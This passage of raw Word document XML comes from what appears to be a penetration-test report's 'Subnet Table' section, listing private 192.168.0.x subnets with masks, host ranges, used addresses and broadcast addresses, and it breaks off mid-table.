    <w:p w14:paraId="2981F0C2" w14:textId="77777777" w:rsidR="00693323" w:rsidRPr="00521489" w:rsidRDefault="00693323" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CA5069B" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E004AAB" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AA171BB" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13A682F2" w14:textId="2498EE42" w:rsidR="004B323B" w:rsidRPr="00521489" w:rsidRDefault="004B323B" w:rsidP="004B323B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc183984549"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Subnet Table</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="30697F17" w14:textId="19F921E9" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The tester discovered that the network is divided into 11 sub networks.  </w:t>
      </w:r>
      <w:r w:rsidR="00F01BA5" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Using a simple subnet calculator the various details, including the number of usable hosts, Subnet Mask, and Range were calculated.  </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1851"/>
        <w:gridCol w:w="1762"/>
        <w:gridCol w:w="1602"/>
        <w:gridCol w:w="841"/>
        <w:gridCol w:w="1647"/>
        <w:gridCol w:w="1647"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="5E3AC49F" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A406C81" w14:textId="6ADAAB91" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Subnet Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="348F4025" w14:textId="354BCB08" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Subnet Mask</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="769C9684" w14:textId="6EB58E58" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Host Range</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7047464D" w14:textId="7645E1C7" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t># of Usable Hosts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7960FE04" w14:textId="566F48F4" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>IP Addresses Used</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18FDDE02" w14:textId="78A7FFD9" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Broadcast Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="26E61A74" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0F95F60F" w14:textId="7B116075" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.224/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="070D5F51" w14:textId="787E5D25" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="270E4CF1" w14:textId="14265CCE" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="003F20FC" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.225-226</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AAA7AF6" w14:textId="099D15C6" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E3075D" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C5E033E" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E3075D" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.225</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="293C1F29" w14:textId="46E56C38" w:rsidR="00E3075D" w:rsidRPr="00521489" w:rsidRDefault="00E3075D" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.226</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0284420A" w14:textId="0E209A9E" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E3075D" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.227</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="6D208F20" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="64919D0C" w14:textId="683D9B1D" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E3075D" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.228/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4142BC16" w14:textId="256D8226" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E3075D" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="383672F5" w14:textId="24DFF691" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E3075D" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192</w:t>
            </w:r>
            <w:r w:rsidR="00353F28" w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>.168.0.229-230</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1BE4E81D" w14:textId="3F02F211" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00353F28" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0AA4AB50" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00353F28" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.229</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37A96279" w14:textId="205FEF66" w:rsidR="00353F28" w:rsidRPr="00521489" w:rsidRDefault="00353F28" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.230</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="174CB0C4" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00353F28" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.231</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78338FCC" w14:textId="616B6626" w:rsidR="00353F28" w:rsidRPr="00521489" w:rsidRDefault="00353F28" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="7CF26D41" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="151FAEF2" w14:textId="06908DCA" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00353F28" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.232/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7B87382D" w14:textId="0EDBE1FF" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00353F28" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D831461" w14:textId="7AD42E00" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="009B46ED" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.233-234</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78B194CB" w14:textId="38F5BBF9" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="009B46ED" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2844AF88" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="009B46ED" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.223</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FA61B7E" w14:textId="09AEE69A" w:rsidR="009B46ED" w:rsidRPr="00521489" w:rsidRDefault="009B46ED" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.234</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="128D5E64" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="009B46ED" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.235</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32799268" w14:textId="34CC4BB2" w:rsidR="009B46ED" w:rsidRPr="00521489" w:rsidRDefault="009B46ED" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="21C8DE90" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7B564FC5" w14:textId="37434B71" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00DA5A1A" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.240/</w:t>
            </w:r>
            <w:r w:rsidR="00D56377" w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="393F2DD4" w14:textId="373B8DDF" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00D56377" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="47CE0232" w14:textId="65E343CE" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E87F84" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.241-242</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="45370C62" w14:textId="5AAD1EBC" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E87F84" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25E751F1" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E87F84" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.241</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BE2EBBB" w14:textId="7734D311" w:rsidR="00E87F84" w:rsidRPr="00521489" w:rsidRDefault="00E87F84" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.242</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7B7A66DB" w14:textId="05606319" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00E87F84" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.243</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D500C" w:rsidRPr="00521489" w14:paraId="42BB1C29" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A1710FB" w14:textId="333BCDC4" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.32/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
